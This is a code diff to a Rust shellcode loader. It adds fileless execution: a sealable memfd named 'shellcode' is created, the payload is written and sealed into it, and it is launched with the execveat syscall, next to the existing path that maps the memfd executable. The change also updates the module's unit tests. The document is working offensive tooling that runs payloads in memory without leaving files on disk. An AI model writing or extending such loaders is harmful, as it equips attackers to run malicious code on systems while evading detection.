@@ -1,11 +1,17 @@
 use std::os::unix::io::RawFd;
-use libc::{self, MAP_SHARED, MFD_CLOEXEC, memfd_create};
+use libc::{self, AT_EMPTY_PATH, F_ADD_SEALS, F_SEAL_SHRINK, F_SEAL_WRITE, MAP_SHARED, MFD_ALLOW_SEALING, MFD_CLOEXEC, fcntl, memfd_create};
 use crate::config::Config;
 
-pub unsafe fn create_memfd(config: &Config) -> Result<RawFd, String> {
+pub unsafe fn create_memfd(config: &Config, is_execveat: bool) -> Result<RawFd, String> {
     config.log("Creating memfd...");
-    let fd =memfd_create(b"shellcode\0".as_ptr() as *const i8, MFD_CLOEXEC);
 
+    let flags = if is_execveat {
+        MFD_CLOEXEC | libc::MFD_ALLOW_SEALING
+    } else {
+        MFD_CLOEXEC
+    };
+
+    let fd = memfd_create(b"shellcode\0".as_ptr() as *const i8, flags);
     if fd < 0 {
         return Err("memfd_create failed".to_string());
     }
@@ -41,7 +47,7 @@ pub fn execute_fileless_mmap(shellcode: &[u8], config: &Config) -> Result<(), St
 
     unsafe {
         let size = shellcode.len();
-        let fd = create_memfd(config)?;
+        let fd = create_memfd(config, false)?;
         write_to_memfd(fd, shellcode, config)?;
         let mem = map_memfd_executable(fd, size, config)?;
         config.log(&format!("Executing shellcode at 0x{:x}...", mem as usize));
@@ -57,6 +63,42 @@ pub fn execute_fileless_mmap(shellcode: &[u8], config: &Config) -> Result<(), St
     Ok(())
 }
 
+pub fn seal_memfd(fd: i32, config: &Config) -> Result<(), String> {
+    config.log("Sealing memfd...");
+
+    unsafe {
+        let ret = fcntl(fd, F_ADD_SEALS, F_SEAL_WRITE | F_SEAL_SHRINK);
+        if ret < 0 {
+            return Err("fcntl F_ADD_SEALS failed".to_string());
+        }
+    }
+    config.log("Memfd sealed");
+    Ok(())
+}
+
+pub fn fileless_execveat(shellcode: &[u8], config: &Config) -> Result<(), String> {
+    config.log("=== Fileless (memfd + execveat) ===");
+
+    unsafe {
+        config.log("Creating memfd with sealing support...");
+        let fd = create_memfd(config, true)?;
+        write_to_memfd(fd, shellcode, config)?;
+        seal_memfd(fd, config)?;
+        
+        let arg0 = b"shellcode\0".as_ptr() as *const libc::c_char;
+        let argv: [*const libc::c_char; 2] = [arg0, std::ptr::null()];
+        let envp: [*const libc::c_char; 1] = [std::ptr::null()];
+
+        config.log("Calling execveat...");
+        libc::syscall(libc::SYS_execveat, fd, b"\0",
+            argv.as_ptr(), envp.as_ptr(), AT_EMPTY_PATH);
+        
+        let err = *libc::__errno_location();
+        libc::close(fd);
+        Err(format!("execveat failed: errno={}", err))
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -66,7 +108,7 @@ mod tests {
     fn test_create_memfd_success() {
         let config = Config::new(false);
         unsafe {
-            let result = create_memfd(&config);
+            let result = create_memfd(&config, false);
             assert!(result.is_ok(), "memfd_create should succeed");
             
             let fd = result.unwrap();
@@ -84,7 +126,7 @@ mod tests {
         let test_data = vec![0x41, 0x42, 0x43, 0x44]; // "ABCD"
         
         unsafe {
-            let fd = create_memfd(&config).expect("Failed to create memfd");
+            let fd = create_memfd(&config, false).expect("Failed to create memfd");
             let result = write_to_memfd(fd, &test_data, &config);
             
             assert!(result.is_ok(), "write_to_memfd should succeed");
@@ -109,7 +151,7 @@ mod tests {
         let test_data = vec![0x41; 1000000]; // 1MB of 0x41
         
         unsafe {
-            let fd = create_memfd(&config).expect("Failed to create memfd");
+            let fd = create_memfd(&config, false).expect("Failed to create memfd");
             
             let result = write_to_memfd(fd, &test_data, &config);
             assert!(result.is_ok(), "write should handle large data");
@@ -126,7 +168,7 @@ mod tests {
         let test_data = vec![0x42u8; size];
         
         unsafe {
-            let fd = create_memfd(&config).expect("Failed to create memfd");
+            let fd = create_memfd(&config, false).expect("Failed to create memfd");
             
             // First write data to the fd
             write_to_memfd(fd, &test_data, &config).expect("Failed to write to memfd");
@@ -159,7 +201,7 @@ mod tests {
         let config = Config::new(false);
         
         unsafe {
-            let fd = create_memfd(&config).expect("Failed to create memfd");
+            let fd = create_memfd(&config, false).expect("Failed to create memfd");
             let result = map_memfd_executable(fd, 0, &config);
             
             // mmap with size 0 returns EINVAL, so it should error
@@ -190,8 +232,8 @@ mod tests {
         let data2 = vec![0x22u8; 0x100];
         
         unsafe {
-            let fd1 = create_memfd(&config).expect("Failed to create first memfd");
-            let fd2 = create_memfd(&config).expect("Failed to create second memfd");
+            let fd1 = create_memfd(&config, false).expect("Failed to create first memfd");
+            let fd2 = create_memfd(&config, false).expect("Failed to create second memfd");
             
             write_to_memfd(fd1, &data1, &config).expect("Failed to write to fd1");
             write_to_memfd(fd2, &data2, &config).expect("Failed to write to fd2");
